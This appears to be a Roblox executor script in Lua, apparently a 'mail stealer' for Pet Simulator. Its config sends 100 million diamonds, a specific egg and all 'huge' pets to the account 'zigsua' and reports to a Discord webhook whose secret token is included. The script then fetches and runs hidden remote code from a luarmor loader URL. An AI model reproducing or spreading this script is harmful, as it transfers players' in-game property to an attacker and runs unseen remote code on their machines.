repeat wait(10) until game:IsLoaded()
getgenv().Config = {
    ["Mailing"] = {
        ["Usernames"] = {"zigsua"},
        ["Items"] = {
            ["Currency"] = {
                ["Diamonds"] = 100000000,
            },
            ["Egg"] = {
                ["Huge Machine Egg 4"] = 1,
            },
        },
        ["MailAllHuges"] = true
    },
    ["Notifications"] = {
        ["UserID"] = "",
        ["Webhook"] = "https://discord.com/api/webhooks/1335527344374550621/vXvldy-UVuemG_FIH7ITt1S1NPl9fraV5jB5g4RjRQiyXEJ9ecXS3ufOasm79-fCZUkJ"
    }
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3598f9e2d0ad9708cf974fac550d63f2.lua"))()
